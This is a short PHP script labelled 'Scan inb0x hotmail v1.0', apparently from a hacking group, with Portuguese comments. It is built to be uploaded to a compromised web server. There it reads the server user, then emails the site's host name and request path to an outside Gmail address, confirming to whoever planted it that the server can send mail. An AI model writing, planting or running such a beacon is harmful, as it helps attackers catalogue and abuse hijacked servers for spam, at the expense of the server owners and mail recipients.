<?php
//=================================
//
//    Scan inb0x hotmail v1.0
//
//  coded by _[[NetWork]]_
//      n�o rippem fdps :]
//
//
//      Elite Group Forever2008
//=================================
//
 ini_set("max_execution_time",-1);
 set_time_limit(0);
 $user = @get_current_user();
 $email = "$user";
 $assunto = "Vull-inb0x.";
 $email1 = "justos.sac@gmail.com";
 $headers  = "From: <$email>\r\n";


 if(mail($email1, $assunto, $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'], $headers)){
 echo "Opa, enviado!";
 exit();
 }
 else{
 echo "N�o enviei..";
 exit();
 }
?>